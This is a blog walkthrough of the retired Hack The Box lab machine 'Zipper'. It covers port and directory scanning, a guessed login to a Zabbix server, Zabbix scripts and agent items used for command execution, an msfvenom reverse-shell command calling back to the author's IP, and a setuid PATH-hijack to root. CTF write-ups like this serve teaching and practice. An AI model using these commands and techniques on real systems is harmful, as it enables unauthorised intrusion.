@@ -1,0 +1,201 @@
+
+
+Zipper: Hack The Box Walkthrough
+
+
+
+
+
+
+
+
+Bernie Lim
+
+
+
+
+A security enthusiast. Likes cats.
+
+
+
+
+
+23 Feb 2019
+
+
+
+5 min read
+
+
+0 Comments
+
+
+
+
+
+This post documents the complete walkthrough of Zipper, a retired vulnerable VM created by burmat, and hosted at Hack The Box. If you are uncomfortable with spoilers, please stop reading now.
+
+Background
+Zipper is retired vulnerable VM from Hack The Box.
+Information Gathering
+Letâs start with a nmap scan to establish the available services in the host.
+# nmap -n -v -Pn -p- -A --reason -T5 -oN nmap.txt 10.10.10.108
+...
+PORT      STATE SERVICE       REASON         VERSION
+22/tcp    open  ssh           syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)                 
+| ssh-hostkey:
+|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
+|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
+|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
+80/tcp    open  http          syn-ack ttl 62 Apache/2.4.29 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+10050/tcp open  zabbix-agent? syn-ack ttl 63
+
+nmap finds 22/tcp and 80/tcp open. Nothing unusual. In any case, letâs enumerate the http service further.
+Directory/File Enumeration
+As usual, my first goto tool is wfuzz. The wordlist Iâm using is SecListsâ quickhits.txt.
+# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --hc '403,404' http://10.10.10.108/FUZZ
+********************************************************
+* Wfuzz 2.2.11 - The Web Fuzzer                        *
+********************************************************
+
+Target: http://10.10.10.108/FUZZ
+Total requests: 2371
+
+==================================================================
+ID      Response   Lines      Word         Chars          Payload    
+==================================================================
+
+002365:  C=200     31 L      188 W         3105 Ch        "/zabbix/"
+
+Total time: 79.53206
+Processed Requests: 2371
+Filtered Requests: 2370
+Requests/sec.: 29.81187
+
+Hmm, interesting. This is how it looks like.
+
+
+
+Hmm. Guest login is allowed.
+
+
+
+I knew I had to try my luck at the login when I saw Zapperâs Backup Script.
+
+
+
+I tried (zapper:zapper).
+
+
+
+And this is the result.
+
+
+
+A quick check with Zabbix 3.0 documentation reveals that GUI access although enabled by default, can be disabled. Alternatively, one can still access the Zabbix server through the web-based application programming interface (or API). In fact, the Zabbix CLI Tools Wiki provides links to a couple of Zabbix CLI tools that allows us to interact with the Zabbix server through a text-based interface.
+Iâve chosen zabbix-cli simply because itâs available in the Kali repository. The instructions to install, configure zabbix-cli is beyond the scope of this write-up.
+
+
+
+Voila. I have access to the Zabbix server.
+
+
+
+Iâll create a user and place it at the âZabbix administratorsâ user group, where GUI access is allowed.
+
+
+
+I created a user ironman with the password marvelstud10s.
+
+
+
+There you have it. The good thing about Zabbix is the ability to create and run scripts.
+
+
+
+Letâs create a reverse shell script with nc like so.
+
+
+
+The script can be triggered by clicking on any host to bring up the context menu like so.
+
+
+
+I have shell. Too bad itâs a shell to the Zabbix server container.
+
+
+
+I wonder what this means.
+
+
+
+Anyway, I found a /backups directory containing two password-protected 7-zip files.
+
+
+
+I also found a copy of backup_script.sh lying around.
+
+
+
+The password is in backup_script.sh!
+
+
+
+Letâs keep the password in mind. It might be useful later.
+Low-Privilege Shell
+I found the key to getting a low-privilege shell while exploring the Zabbix server. I noticed that thereâs a host Zipper installed with a Zabbix Agent, and one can create an item to instruct the agent to run system commands like so!
+
+
+
+I generated a reverse shell with msfvenom. Prior to this, Iâve experimented with various commands and verified that the host is running 32-bit Ubuntu. Next, to facilitate transfer of the reverse shell, I host the executable with Pythonâs SimpleHTTPServer.
+# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.13.52 LPORT=4321 -f elf -o rev
+# python -m SimpleHTTPServer 80
+
+The moment I caught the reverse shell, I immediately deleted the item to prevent the command from running again.
+
+
+
+Letâs upgrade the shell to a full TTY since Python 3 is available.
+
+
+
+Iâm in Zipper alright! Recall the password earlier? Letâs see if we can su to zapper.
+
+
+
+Perfect. user.txt is in zapperâs home directory.
+
+
+
+Privilege Escalation
+During enumeration of zapperâs account, I notice a setuid executable at /home/zapper/utils.
+
+
+
+The privilege escalation is pretty straight forward. The executable uses system(3) library function to run systemctl. Itâs the classic Linux executable search path attack. Check out the path to systemctl and the $PATH environment variable.
+
+
+
+The system(3) library function essentially searches for systemctl in the first path that it finds. What happens if we place a malicious systemctl executable in a path we control? Privilege escalation!
+Letâs write a malicious systemctl like so.
+
+
+
+Compile the code with gcc and export PATH with /tmp as the first path to search.
+
+
+
+Executing zabbix-service is all thatâs left to be root.
+
+
+
+Getting root.txt is trivial with a root shell.
+
+
+
+
+
